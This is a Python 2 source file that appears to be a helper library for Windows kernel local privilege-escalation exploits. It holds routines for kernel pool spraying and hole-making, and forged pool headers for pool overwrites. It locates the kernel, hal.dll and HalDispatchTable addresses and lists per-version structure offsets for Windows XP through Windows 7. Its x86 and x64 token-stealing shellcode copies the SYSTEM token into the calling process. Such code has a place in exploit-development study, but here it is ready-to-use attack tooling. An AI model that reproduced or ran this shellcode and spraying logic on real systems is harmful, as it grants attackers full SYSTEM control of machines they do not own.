import sys
import struct
from ctypes import *
import sys, platform
from ctypes.wintypes import HANDLE, DWORD

VER_NT_WORKSTATION 			= 1 # The system is a workstation.
VER_NT_DOMAIN_CONTROLLER	= 2	# The system is a domain controller.
VER_NT_SERVER				= 3	# The system is a server, but not a domain controller.

GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x3

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
STATUS_SUCCESS = 0

FILE_DEVICE_UNKNOWN = 0x00000022

METHOD_BUFFERED		= 0x0
METHOD_IN_DIRECT	= 0x1
METHOD_OUT_DIRECT	= 0x2
METHOD_NEITHER	    = 0x3

FILE_READ_DATA		= 0x1
FILE_WRITE_DATA 	= 0x2
FILE_ANY_ACCESS		= 0x0

FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0x0

Psapi    = windll.Psapi
kernel32 = windll.kernel32
ntdll = windll.ntdll

kernel_object_sizes = {}

#sizes of various kernel objects
kernel_object_sizes['unnamed_mutex'] = 0x50
kernel_object_sizes['unnamed_job'] = 0x168
kernel_object_sizes['iocompletionreserve'] = 0x60
kernel_object_sizes['unnamed_semaphore'] = 0x48
kernel_object_sizes['event'] = 0x40

pool_object_handles = []

#the first 0x28 bytes in the pool allocation, which will allow an overwrite
#the previous size and and the TypeIndex is set zero
pool_object_headers = {}
pool_object_headers['unnamed_mutex'] = [0x040a0000,0xe174754d,0x00000000,0x00000050,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['unnamed_job'] = [0x042d0000,0xa0626f4a,0x00000000,0x00000168,0x0000006c,0x86e0bd80,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['iocompletionreserve'] = [0x040c0000,0xef436f49,0x00000000,0x0000005c,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['unnamed_semaphore'] = [0x04090000,0xe16d6553,0x00000000,0x00000044,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['event'] = [0x04080000,0xee657645,0x00000000,0x00000040,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]

"""
#The original typeindex (in case I need it later)
original_typeindex = {}
original_typeindex['unnamed_mutex'] = 0xe
original_typeindex['unnamed_job'] = 0x6
original_typeindex['iocompletionreserve'] = 0xa
original_typeindex['unnamed_semaphore'] = 0x10
original_typeindex['event'] = 0xc
"""

SPRAY_COUNT = 50000

def allocate_object(object_to_use, variance):
	"""
	Allocate an object based on the input
	"""
	hHandle = HANDLE(0)
	if object_to_use == 'unnamed_mutex':
		hHandle = kernel32.CreateMutexA(None, False, None)
	elif object_to_use == 'named_mutex':
		hHandle = kernel32.CreateMutexA(None, False, "Pool spraying is cool %s" % variance)
	elif object_to_use == 'unnamed_job':
		hHandle = kernel32.CreateJobObjectA(None, None)
	elif object_to_use == 'named_job':
		hHandle = kernel32.CreateJobObjectA(None, "Job %s" % variance)
	elif object_to_use == 'iocompletionport':
		hHandle = kernel32.CreateIoCompletionPort(-1, None, 0, 0)
	elif object_to_use == 'iocompletionreserve':
		IO_COMPLETION_OBJECT = 1
		ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
		hHandle = hHandle.value
	elif object_to_use == 'unnamed_semaphore':
		hHandle = kernel32.CreateSemaphoreA(None, 0, 3, None)
	elif object_to_use == 'named_semaphore':
		hHandle = kernel32.CreateSemaphoreA(None, 0, 3, "My little Semaphore %s" % variance)
	elif object_to_use == 'event':
		hHandle = kernel32.CreateEventA(None, False, False, None)
	if hHandle == None:
		print "[-] Error while creating object: %s" % object_to_use
		return -1
	return hHandle

def find_object_to_spray(required_hole_size):
	"""
	Calculates which object to use for kernel pool spraying
	"""
	for key in kernel_object_sizes:
		if required_hole_size % kernel_object_sizes[key] == 0:
			print "[+] Found a good object to spray with: %s" % key
			return key
	print "[-] Couldn't find proper object to spray with"
	sys.exit()

def spray(required_hole_size):
	"""
	Spray the heap with objects which will allow us to create the required holes later
	"""
	global pool_object_handles
	good_object = find_object_to_spray(required_hole_size)
	for i in range(SPRAY_COUNT):
		pool_object_handles.append(allocate_object(good_object, i))
	print "[+] Spray done!"
	return good_object

def make_hole(required_hole_size, good_object):
	"""
	Making holes in the sprayd kernel
	"""
	global pool_object_handles
	nr_to_free = required_hole_size / kernel_object_sizes[good_object]
	for i in range(0, SPRAY_COUNT,16):
		for j in range(0,nr_to_free):
			kernel32.CloseHandle(pool_object_handles[i + j])
			pool_object_handles[i + j] = None
	print "[+] Making holes done!"

def gimme_the_hole(required_hole_size):
	"""
	Spray and make holes
	"""
	good_object = spray(required_hole_size)
	make_hole(required_hole_size, good_object)
	return good_object

def close_all_handles():
	"""
	Close all handles
	"""
	print "[+] Triggering shellcode!"
	global pool_object_handles
	for i in range(0, SPRAY_COUNT):
		if (pool_object_handles[i] != None):
			kernel32.CloseHandle(pool_object_handles[i])
			pool_object_handles[i] = None
	print "[+] Free pool allocations done!"

def calculate_previous_size(required_hole_size):
	"""
	Calculate the previous size value for the pool header
	The PreviousSize value * 8 = previous chunk
	"""
	return required_hole_size/8

def pool_overwrite(required_hole_size,good_object):
	"""
	This function will give us the data to be used for the pool overwrite
	"""
	header = ''
	for i in range(len(pool_object_headers[good_object])):
		if i == 0:
			header += struct.pack("L",pool_object_headers[good_object][0] + calculate_previous_size(required_hole_size))
		else:
			header += struct.pack("L",pool_object_headers[good_object][i])
	return header

def ctl_code(function,
             devicetype = FILE_DEVICE_UNKNOWN,
             access = FILE_ANY_ACCESS,
             method = METHOD_NEITHER):
    """Recreate CTL_CODE macro to generate driver IOCTL"""
    return ((devicetype << 16) | (access << 14) | (function << 2) | method)

#https://www.exploit-db.com/exploits/34272/
def getLastError():
    """Format GetLastError"""
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), NULL,
            buf, sizeof(buf), NULL):
        print "[-] " +  buf.value
    else:
        print "[-] Unknown Error"

#https://www.exploit-db.com/exploits/34272/
def alloc_memory(base_address, input, input_size):
	"""
	Allocate input buffer
	"""
	print "[*] Allocating input buffer"
	base_address_c   = c_int(base_address)
	input_size_c = c_int(input_size)
	ntdll.NtAllocateVirtualMemory.argtypes = [c_int,
											  POINTER(c_int),
											  c_ulong,
											  POINTER(c_int),
											  c_int,
											  c_int]
	dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF,
											 byref(base_address_c),
											 0x0, 
											 byref(input_size_c), 
											 MEM_RESERVE|MEM_COMMIT,
											 PAGE_EXECUTE_READWRITE)
	if dwStatus != STATUS_SUCCESS:
		print "[-] Error while allocating memory: %s" % dwStatus
		getLastError()
		sys.exit()
	written = c_ulong()
	alloc = kernel32.WriteProcessMemory(0xFFFFFFFF, base_address, input, len(input), byref(written))
	if alloc == 0:
		print "[-] Error while writing our input buffer memory: %s" % alloc
		getLastError()
		sys.exit()

#https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
def find_driver_base(driver=None):
	if platform.architecture()[0] == '64bit':
		lpImageBase = (c_ulonglong * 1024)()
		lpcbNeeded = c_longlong()
		Psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
	else:
		lpImageBase = (c_ulong * 1024)()
		lpcbNeeded = c_long()
	driver_name_size = c_long()
	driver_name_size.value = 48
	Psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))
	for base_addr in lpImageBase:
		driver_name = c_char_p('\x00' * driver_name_size.value)
		if base_addr:
			Psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
			if driver == None and driver_name.value.lower().find("krnl") != -1:
				print "[+] Retrieving kernel info..."
				print "[+] Kernel version:", driver_name.value
				print "[+] Kernel base address: %s" % hex(base_addr)
				return (base_addr, driver_name.value)
			elif driver_name.value.lower() == driver:
				print "[+] Retrieving %s info..." % driver_name
				print "[+] %s base address: %s" % (driver_name, hex(base_addr))
				return (base_addr, driver_name.value)
	return None	
 
#https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
def get_haldispatchtable():
 	if platform.architecture()[0] == '64bit':
		kernel32.LoadLibraryExA.restype = c_uint64
		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
		kernel32.GetProcAddress.restype = c_uint64
	(krnlbase, kernelver) = find_driver_base()
	hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
	HalDispatchTable = kernel32.GetProcAddress(hKernel, 'HalDispatchTable')
	HalDispatchTable -= hKernel
	HalDispatchTable += krnlbase
	print "[+] HalDispatchTable address:", hex(HalDispatchTable)
	return HalDispatchTable
	
def get_haldisp_ofsetsx86():
	(halbase, dllname) = find_driver_base("hal.dll")
	version = sys.getwindowsversion()

	if((version.major == 5) and (version.minor == 1) and ('3' in version.service_pack)):
		# the target machine's OS is Windows XP SP3
		HaliQuerySystemInformation = halbase+0x16bba # Offset for XPSP3
		HalpSetSystemInformation   = halbase+0x19436 # Offset for XPSP3
	elif((version.major == 5) and (version.minor == 2) and ('2' in version.service_pack)):
		# the target machine's OS is Windows Server 2003 SP2
		HaliQuerySystemInformation = halbase+0x1fa1e # Offset for WIN2K3
		HalpSetSystemInformation   = halbase+0x21c60 # Offset for WIN2K3
	elif((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
		# the target machine's OS is Windows 7x86 SP1
		HaliQuerySystemInformation = halbase+0x278a2 # Offset for WIN7SP1x86
		HalpSetSystemInformation   = halbase+0x281b4 # Offset for WIN7SP1x86
	else:
		HaliQuerySystemInformation = 0x0
		HalpSetSystemInformation = 0x0
	print "[+] HaliQuerySystemInformation address:", hex(HaliQuerySystemInformation)
	print "[+] HalpSetSystemInformation address:", hex(HalpSetSystemInformation)
	return (HaliQuerySystemInformation,HalpSetSystemInformation)

def get_haldisp_ofsetsx64():
	(halbase, dllname) = find_driver_base("hal.dll")
	version = sys.getwindowsversion()

	if((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
		# the target machine's OS is Windows 7x64 SP1
		HaliQuerySystemInformation = halbase+0x398e8 # Offset for win7 x64
	else:
		HaliQuerySystemInformation = 0x0
		HalpSetSystemInformation = 0x0
		
	print "[+] HaliQuerySystemInformation address:", hex(HaliQuerySystemInformation)
	print "[+] HalpSetSystemInformation address:", hex(HalpSetSystemInformation) 
	return (HaliQuerySystemInformation,HalpSetSystemInformation)

def setosvariablesx86():
	"""
	Set various structure variables based on OS version
	"""
	KPROCESS = ''
	APLINKS = ''
	UPID = ''
	TOKEN = ''
	version = sys.getwindowsversion()

	if((version.major == 5) and (version.minor == 1) and ('3' in version.service_pack)):
		# the target machine's OS is Windows XP SP3
		print "[*] OS version: Windows XP SP3"
		KPROCESS = '\x44'
		TOKEN	= '\xC8'
		UPID	 = '\x84'
		APLINKS  = '\x88'
 
	elif((version.major == 5) and (version.minor == 2) and ('2' in version.service_pack)):
		# the target machine's OS is Windows Server 2003 SP2
		print "[*] OS version: Windows Server 2003 SP2"
		KPROCESS = '\x38'
		TOKEN	= '\xD8'
		UPID	 = '\x94'
		APLINKS  = '\x98'
 
	elif((version.major == 6) and (version.minor == 0) and ('1' in version.service_pack or '2' in version.service_pack) and (version.product_type == VER_NT_WORKSTATION)):
		# the target machine's OS is Windows Vista SP1 / SP2
		print "[*] OS version: Windows Vista SP1 / SP2"
		KPROCESS = '\x48'
		TOKEN	= '\xE0'
		UPID	 = '\x9C'
		APLINKS  = '\xA0'
 
	elif((version.major == 6) and (version.minor == 0) and ('1' in version.service_pack or '2' in version.service_pack) and (version.product_type != VER_NT_WORKSTATION)):
		# the target machine's OS is Windows Server 2008 / SP2
		print "[*] OS version: Windows Server 2008 / SP2"
		KPROCESS = '\x48'
		TOKEN	= '\xE0'
		UPID	 = '\x9C'
		APLINKS  = '\xA0'
 
	elif((version.major == 6) and (version.minor == 1)):
		# the target machine's OS is Windows 7 / SP1
		print "[*] OS version: Windows 7 / SP1"
		KPROCESS = '\x50'
		TOKEN	= '\xF8'
		UPID	 = '\xB4'
		APLINKS  = '\xB8'
	
	else:
		print "[-] No matching OS version, exiting..."
		sys.exit(-1)
	
	return (KPROCESS,APLINKS,UPID,TOKEN)

def setosvariablesx64():
	"""
	Set various structure variables based on OS version
	"""
	KPROCESS = ''
	FLINK = ''
	UPID = ''
	TOKEN = ''
	version = sys.getwindowsversion()
	if((version.major == 5) and (version.minor == 2)):
		# the target machine's OS is Windows Server 2003
		print "[*] OS version: Windows Server 2003"
		KPROCESS = '\x68'
		TOKEN	= '\x60\x01' #0x160
		UPID	 = '\xd8\x00'
		FLINK  = '\xe0\x00'
	elif((version.major == 6) and (version.minor == 1) and ('1' in version.service_pack)):
		# the target machine's OS is Windows 7x64 SP1
		#tbd
		print "[*] OS version: Windows 7x64 SP1"
		KPROCESS = '\x70'
		TOKEN	= '\x08\x02'  #0x208
		UPID	 = '\x80\x01' #180
		FLINK  = '\x88\x01'   #188
	else:
		print "[-] No matching OS version, exiting..."
		sys.exit(-1)
		
	return (KPROCESS,FLINK,UPID,TOKEN)


def retore_hal_ptrs(HalDispatchTable,HaliQuerySystemInformation,HalpSetSystemInformation):
	"""
	Retrun a shellcode to retore HalDispatchTable ptrs
	"""
	if HaliQuerySystemInformation == 0x0 or HalpSetSystemInformation == 0x0:
		return ""
	else:
		shellcode = (
		"\x31\xc0"
		"\xb8" + struct.pack("L", HalpSetSystemInformation) +
		"\xa3" + struct.pack("L", HalDispatchTable + 0x8) +
		"\xb8" + struct.pack("L", HaliQuerySystemInformation) +
		"\xa3" + struct.pack("L", HalDispatchTable + 0x4)
		)
	
		return shellcode

def restoretokenx86(RETVAL, extra = ""):
	"""
	Retrun a token restore shellcode related to the platform
	"""
	(KPROCESS,APLINKS,UPID,TOKEN) = setosvariablesx86()
	shellcode =  (
	"\x52"
	"\x33\xc0"									# xor	eax,eax
	"\x64\x8b\x80\x24\x01\x00\x00"				# mov	eax,DWORD PTR fs:[eax+0x124]
	"\x8b\x40" + KPROCESS  +					# mov	eax,DWORD PTR [eax+_KPROCESS]
	"\x8b\x15\x00\x09\x02\x00"
	"\x89\x90" + TOKEN + "\x00\x00\x00"			# mov	edx,DWORD PTR [eax+0xf8]
	"\x5a"
	)
	
	if RETVAL == "":
		shellcode += "\xc3"						#retn
	else:
		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
	
	return shellcode

#https://www.exploit-db.com/exploits/18176/
def tokenstealingx86(RETVAL, extra = ""):
	"""
	Retrun a token stealing shellcode related to the platform
	"""
	(KPROCESS,APLINKS,UPID,TOKEN) = setosvariablesx86()
	shellcode = (
	"\x60"										# pushad
	"\x33\xc0"									# xor	eax,eax
	"\x64\x8b\x80\x24\x01\x00\x00"				# mov	eax,DWORD PTR fs:[eax+0x124]
	"\x8b\x40" + KPROCESS +						# mov	eax,DWORD PTR [eax+_KPROCESS]
	"\x8b\xc8"									# mov	ecx,eax
	"\x8b\x80" + APLINKS + "\x00\x00\x00"		# mov	eax,DWORD PTR [eax+0xb8]
	"\x2d" + APLINKS + "\x00\x00\x00"			# sub	eax,0xb8
	"\x83\xb8" + UPID + "\x00\x00\x00\x04"		# cmp	DWORD PTR [eax+0xb4],0x4
	"\x75\xec"									# jne	0xe
	"\x8b\x90" + TOKEN + "\x00\x00\x00"			# mov	edx,DWORD PTR [eax+0xf8]
	"\x89\x91" + TOKEN + "\x00\x00\x00"			# mov	DWORD PTR [ecx+0xf8],edx
	"\x61"										# popad
	)
	
	shellcode += extra #append extra code after token stealing shellcode, e.g.: restore stack
	
	if RETVAL == "":
		shellcode += "\xc3"						#retn
	else:
		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
	
	return shellcode
	
def tokenstealingx64(RETVAL, extra = ""):
	"""
	Retrun a token stealing shellcode related to the platform
	"""
	(KPROCESS,FLINK,UPID,TOKEN) = setosvariablesx64()
	shellcode = (
	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"		# mov     rax, [gs:0x188]         ;Get current ETHREAD in
	"\x48\x8b\x40" + KPROCESS +					# mov     rax, [rax+0x68]         ;Get current KPROCESS address
	"\x48\x89\xc1"								# mov     rcx, rax                ;Copy current KPROCESS address to RCX
	"\x48\x8b\x80" + FLINK + "\x00\x00"			# mov     rax, [rax+0xe0]         ;Next KPROCESS ActivKPROCESSLinks.Flink
	"\x48\x2d" + FLINK + "\x00\x00"				# sub     rax, 0xe0               ;Go to the beginning of the KPROCESS structure
	"\x4c\x8b\x88" + UPID + "\x00\x00"			# mov     r9 , [rax+0xd8]         ;Copy PID to R9
	"\x49\x83\xf9\x04"							# cmp     r9 , 0x4                ;Compare R9 to SYSTEM PID (=4)
	"\x75\xe6"									# jnz short find_system_process   ;If not SYSTEM got to next KPROCESS
	"\x48\x8b\x90" + TOKEN + "\x00\x00"			# mov     rdx, [rax+0x160]        ;Copy SYSTEM process token address to RDX
	"\x48\x89\x91" + TOKEN + "\x00\x00"			# mov     [rcx+0x160], rdx        ;Steal token with overwriting our current process's token address
	)
	
	shellcode += extra #append extra code after token stealing shellcode, e.g.: restore stack

	if RETVAL == "":
		shellcode += "\xc3"						#retn
	else:
		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
	
	return shellcode

def tokenstealing(RETVAL, extra = ""):
	if sys.maxint > 2147483647: return tokenstealingx64(RETVAL, extra)
	else: return tokenstealingx86(RETVAL, extra)